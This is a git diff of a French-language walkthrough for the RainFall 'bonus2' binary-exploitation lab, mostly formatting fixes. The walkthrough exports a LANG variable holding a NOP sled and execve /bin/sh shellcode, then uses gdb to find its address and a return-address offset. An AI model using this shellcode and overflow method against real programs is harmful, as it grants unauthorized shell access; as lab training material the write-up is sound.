@@ -60,7 +60,7 @@ int main(int ac, char **av)
 }
 ```
 
-Ici nous allons utiliser la variable lang pour y stocker un shell code et ecraser l'adresse de retour de `greetuser()` par l'adresse de notre shellcode. Nous pouvons egalement faire un `NOP-Sled` pour securiser notre execution de shellcode. Voici donc comment exporter notre variable d'environement:
+Ici nous allons utiliser la variable `lang` pour y stocker un shellcode et ecraser l'adresse de retour de `greetuser()` par l'adresse de notre shellcode. Nous pouvons egalement faire un `NOP-Sled` pour securiser notre execution de shellcode. Voici donc comment exporter notre variable d'environement:
 
 ```bash
 bonus2@RainFall:~$ export LANG=$(python -c 'print "nl" + "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
@@ -80,10 +80,12 @@ This GDB was configured as "i686-linux-gnu".
 For bug reporting instructions, please see:
 <http://bugs.launchpad.net/gdb-linaro/>...
 Reading symbols from /home/user/bonus2/bonus2...(no debugging symbols found)...done.                                           (gdb) break *main+125
+(gdb) break *main+125
 Breakpoint 1 at 0x80485a6
 (gdb) run asdf asdf
 Starting program: /home/user/bonus2/bonus2 asdf asdf
 Breakpoint 1, 0x080485a6 in main ()                                                                                            (gdb) x/20s *((char **)environ)                                                                                                0xbffff8a5:      "SHELL=/bin/bash"                                                                                             0xbffff8b5:      "TERM=xterm-256color"
+(gdb) x/20s *((char **)environ)
 0xbffff8c9:      "SSH_CLIENT=10.0.2.2 43170 4242"                                                                              0xbffff8e8:      "SSH_TTY=/dev/pts/0"
 0xbffff8fb:      "USER=bonus2"
 0xbffff907:      "LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31"...
@@ -103,9 +105,8 @@ Il nous faut aussi l'offset a partir duquel ecrire notre nouvelle adresse:
 ```bash
 bonus2@RainFall:~$ gdb ./bonus2
 (gdb) run $(python -c 'print "A" * 40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A                                                                                                                  Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A" * 40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
-                                                                                 Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
-
-                                          Program received signal SIGSEGV, Segmentation fault.
+Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
+Program received signal SIGSEGV, Segmentation fault.
 0x38614137 in ?? () # Offset = 23
 ```
 
